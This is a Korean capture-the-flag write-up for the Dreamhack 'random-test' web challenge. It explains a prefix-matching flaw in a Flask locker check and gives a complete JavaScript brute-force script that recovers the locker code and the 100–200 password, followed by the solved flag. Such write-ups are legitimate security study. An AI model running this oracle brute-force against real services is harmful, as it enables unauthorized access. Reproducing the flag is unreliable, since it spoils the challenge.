---
title: "Dreamhack random-test Write-up"
date: 2026-05-14
categories:
  - CTF
  - Web Hacking
tags:
  - brute-force
  - side-channel
  - flask
---

# [Dreamhack] random-test Write-up

- **Date:** 2026-05-14
- **Category:** Web Hacking
- **Tags:** #Brute_Force #Side_Channel #Flask #Incremental_Search

## 1. Problem Description
"사물함의 비밀번호를 맞춰보세요!"
Flask로 작성된 간단한 사물함 서비스입니다. 임의로 생성된 4자리 문자열(`locker_num`)과 100~200 사이의 숫자(`password`)를 모두 맞춰야 플래그를 획득할 수 있습니다.

## 2. Vulnerability Analysis

### A. Prefix-based Matching (Oracle)
가장 핵심적인 취약점은 사용자가 입력한 `locker_num`을 검증하는 로직에 있습니다.

```python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
    if locker_num == rand_str and password == str(rand_num):
        return render_template("index.html", result = "FLAG:" + FLAG)
    return render_template("index.html", result = "Good")
```

- 서버는 `rand_str` 전체와 비교하기 전에, 입력한 `locker_num`의 길이만큼만 잘라서 정답과 일치하는지 확인합니다.
- 만약 앞부분이 맞다면 `"Good"`을 반환합니다. 
- 이를 통해 한 글자씩 대입해보면서 서버의 응답이 `"Good"`으로 바뀌는 문자를 찾아내는 **Incremental Brute-force**가 가능해집니다.

### B. Weak Random Number Range
- `rand_num`은 `random.randint(100, 200)`으로 생성됩니다.
- 가능한 경우의 수가 101가지밖에 되지 않으므로, `locker_num`을 찾은 뒤에는 매우 빠르게 브루트 포싱이 가능합니다.

## 3. Exploit Path

1. **Incremental Brute-force (ID):** 
   - 첫 번째 자리에 `a-z0-9`를 하나씩 넣어보며 응답이 "Good"인 문자를 찾습니다.
   - 찾은 문자 뒤에 다시 `a-z0-9`를 붙여 두 번째 자리를 찾습니다.
   - 이 과정을 4번 반복하여 `locker_num` 전체를 완성합니다. (최대 36 * 4 = 144번 시도)
2. **Password Brute-force:**
   - 완성된 `locker_num`을 고정하고, `password` 파라미터에 100부터 200까지 숫자를 대입합니다.
3. **Flag Acquisition:**
   - "FLAG:" 문자열이 포함된 응답을 받아 플래그를 획득합니다.

## 4. Exploit Script (JavaScript)

브라우저 콘솔에서 실행한 스크립트입니다.

```javascript
const alphanumeric = "abcdefghijklmnopqrstuvwxyz0123456789";
let locker_num = "";

async function solve() {
  // 1. ID 찾기
  for (let i = 0; i < 4; i++) {
    for (let char of alphanumeric) {
      let test = locker_num + char;
      let formData = new FormData();
      formData.append('locker_num', test);
      formData.append('password', '');
      
      let response = await fetch('/', { method: 'POST', body: formData });
      let text = await response.text();
      if (text.includes("Good") || text.includes("FLAG:")) {
        locker_num = test;
        console.log(`Finding ID... ${locker_num}`);
        break;
      }
    }
  }

  // 2. PW 찾기
  for (let p = 100; p <= 200; p++) {
    let formData = new FormData();
    formData.append('locker_num', locker_num);
    formData.append('password', p.toString());
    
    let response = await fetch('/', { method: 'POST', body: formData });
    let text = await response.text();
    if (text.includes("FLAG:")) {
      console.log(`Success! ID: ${locker_num}, PW: ${p}`);
      console.log(text.match(/FLAG:DH\{.+\}/)[0]);
      break;
    }
  }
}

solve();
```

## 5. Flag
`DH{2e583205a2555b8890d141b51cee41379cead9a65a957e72d4a99568c0a2f955}`
